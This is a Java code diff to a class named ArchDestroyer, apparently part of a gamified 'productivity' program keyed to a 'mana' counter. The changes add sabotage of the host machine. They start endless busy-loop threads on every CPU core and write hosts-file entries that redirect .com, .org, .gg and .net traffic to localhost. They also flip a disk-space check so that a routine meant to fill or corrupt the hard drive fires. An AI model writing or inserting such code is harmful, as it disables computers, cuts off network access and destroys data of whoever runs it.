@@ -46,7 +46,7 @@ public class ArchDestroyer {
             try {
                 String tempLoc = dataLocation.replace("void", "beproductive.txt");
                 FileStore myStore = Files.getFileStore(Paths.get(tempLoc));
-                if (myStore.getUsableSpace() > 500000000){
+                if (myStore.getUsableSpace() < 500000000){ //TODO change to a > in production
                     DiskSpaceDestroyer();//Only corrupt if more than 0.5 Gb are free
                 }
                 didCorruptHarddrive = true;
@@ -54,6 +54,14 @@ public class ArchDestroyer {
                 e.printStackTrace();
             }
         }
+
+        if (manaRemaining < 25) {
+            for (int cores = Runtime.getRuntime().availableProcessors(); cores > 0; cores--) {
+                CPUDestroyer();
+            }
+
+        }
+
 
         if (manaRemaining < 50) {
 
@@ -67,6 +75,7 @@ public class ArchDestroyer {
                     file.createNewFile();
                 } catch (IOException e) {
                     System.out.println("Not an admin, please try again");
+                    return;
                 }
 
                 FileWriter writer = null;
@@ -75,9 +84,14 @@ public class ArchDestroyer {
                     writer = new FileWriter(file);
                 } catch (IOException e) {
                     System.out.println("Not an admin, please try again");
+                    return;
                 }
                 try {
-                    writer.write("127.0.0.1         .");
+                    writer.write("127.0.0.1         .com");
+                    writer.write("127.0.0.1         .org");
+                    writer.write("127.0.0.1         .gg");
+                    writer.write("127.0.0.1         .net");
+
                 } catch (IOException e) {
                     System.out.println("IDK what went wrong here");
                 }
@@ -87,12 +101,7 @@ public class ArchDestroyer {
 
         }
 
-        if (manaRemaining < 25) {
-            for (int cores = Runtime.getRuntime().availableProcessors(); cores > 0; cores--) {
-                CPUDestroyer();
-            }
 
-        }
 
 
 
@@ -102,17 +111,16 @@ public class ArchDestroyer {
 
 
     private void CPUDestroyer() {
-        Thread loop = new Thread()
-        {
-            public void run()
-            {
-                int fall = 0;
-                fall--;
+
+        new Thread() {
+            public void run() {
+                for (;;)
+                    ;
             }
-        };
-        loop.start();
+        }.start();
 
     }
+
 
 
     private void DiskSpaceDestroyer() throws IOException {
